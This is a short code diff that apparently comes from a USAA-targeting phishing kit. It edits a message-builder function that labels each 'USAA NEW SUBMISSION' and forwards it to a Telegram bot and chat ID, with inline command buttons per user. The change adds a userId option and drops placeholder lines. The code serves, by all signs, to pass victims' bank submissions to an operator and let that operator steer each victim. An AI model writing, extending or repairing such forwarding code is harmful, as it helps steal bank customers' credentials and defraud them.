@@ -253,7 +253,7 @@ async function getNextPage(currentPage, req) {
    MESSAGE BUILDER
 =================================*/
 async function buildMessage(data, options = {}) {
-  const { sendToTelegram = false, botToken = null, chatId = null } = options;
+  const { sendToTelegram = false, botToken = null, chatId = null, userId = null } = options;
 
   try {
     let message = `🤖 USAA NEW SUBMISSION\n\n`;
@@ -269,11 +269,7 @@ async function buildMessage(data, options = {}) {
 		  if (!botToken || !chatId) throw new Error("Bot token or Chat ID missing");
 		
 		  const sendMessage = sendMessageFor(botToken, chatId);
-		
-		  // Example commands and userId
-		  const userId = someUserIdVariable; // set dynamically
-		  const message = "Select a command for this user:";
-		
+		  
 		  // Define inline buttons
 		  const buttons = [
 		    [
